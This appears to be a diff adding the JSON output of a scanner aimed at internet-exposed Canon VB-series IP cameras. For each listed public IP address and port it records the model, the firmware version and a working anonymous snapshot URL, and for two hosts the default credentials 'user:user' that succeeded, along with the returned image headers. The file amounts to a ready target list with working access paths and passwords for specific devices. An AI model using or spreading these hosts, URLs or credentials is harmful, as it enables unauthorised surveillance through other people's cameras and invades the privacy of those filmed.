+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 106182,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M600VE Ver. 1.0.3",
+      "model": "VB-M600VE",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://153.125.104.78:8080/-wvhttp-01-/getoneshot?image=img"
+  },
+  "118.243.56.46:8003": {
+    "host": "118.243.56.46",
+    "port": 8003,
+    "url": "http://118.243.56.46:8003/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://118.243.56.46:8003/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 103594,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M700F Ver. 1.1.2",
+      "model": "VB-M700F",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://118.243.56.46:8003/-wvhttp-01-/getoneshot?image=img"
+  },
+  "153.156.252.64:8001": {
+    "host": "153.156.252.64",
+    "port": 8001,
+    "url": "http://153.156.252.64:8001/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://153.156.252.64:8001/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 167300,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.2.11",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://153.156.252.64:8001/-wvhttp-01-/getoneshot?image=img"
+  },
+  "166.239.120.135:8000": {
+    "host": "166.239.120.135",
+    "port": 8000,
+    "url": "http://166.239.120.135:8000/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://166.239.120.135:8000/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 11850,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H41 Ver. 1.1.1",
+      "model": "VB-H41",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://166.239.120.135:8000/-wvhttp-01-/getoneshot?image=img"
+  },
+  "122.135.145.249:8081": {
+    "host": "122.135.145.249",
+    "port": 8081,
+    "url": "http://122.135.145.249:8081/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://122.135.145.249:8081/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 9911,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H43 Ver. 1.2.5",
+      "model": "VB-H43",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://122.135.145.249:8081/-wvhttp-01-/getoneshot?image=img"
+  },
+  "121.117.161.159:80": {
+    "method": "default_creds",
+    "user": "user",
+    "pass": "user",
+    "evidence": "Default creds user:user worked on /-wvhttp-01-/image.cgi",
+    "response": "HTTP/1.1 200 OK\r\nDate: Mon, 24 Aug 2026 05:19:57 GMT\r\nServer: VB/4.0\r\nAccept-Ranges: none\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nConnection: close\r\nLivescope-Status: 0\r\nLivescope-Frame-Number: 1\r\nContent-Type: image/jpeg\r\nContent-Length: 61524\r\n\r\n\ufffd\ufffd\ufffd\ufffd\u0000>VB\u0000\u0001c\ufffdB\ufffd\u0012\ufffd\u0000\u0001j\ufffd\ufffd}\u0002\u001c\u0002\u000b\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0004\u0000\u0002\ufffd\u0001\ufffd\u0001\ufffd\u0000\u0000\u0000\u0000\ufffd2",
+    "host": "121.117.161.159",
+    "port": 80
+  },
+  "121.117.161.147:80": {
+    "method": "default_creds",
+    "user": "user",
+    "pass": "user",
+    "evidence": "Default creds user:user worked on /-wvhttp-01-/image.cgi",
+    "response": "HTTP/1.1 200 OK\r\nDate: Mon, 24 Aug 2026 05:28:54 GMT\r\nServer: VB/4.0\r\nAccept-Ranges: none\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nConnection: close\r\nLivescope-Status: 0\r\nLivescope-Frame-Number: 1\r\nContent-Type: image/jpeg\r\nContent-Length: 14522\r\n\r\n\ufffd\ufffd\ufffd\ufffd\u0000>VB\u0000\u0001BhO\ufffd\nx\u0000\u0001j\ufffd\u0596\u0002\u001c\u0002\u000b\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0004\u0000\u0002\ufffd\u0001\ufffd\u0001\ufffd\u0000\u0000\u0000\u0000\ufffd'",
+    "host": "121.117.161.147",
+    "port": 80
+  }
+}
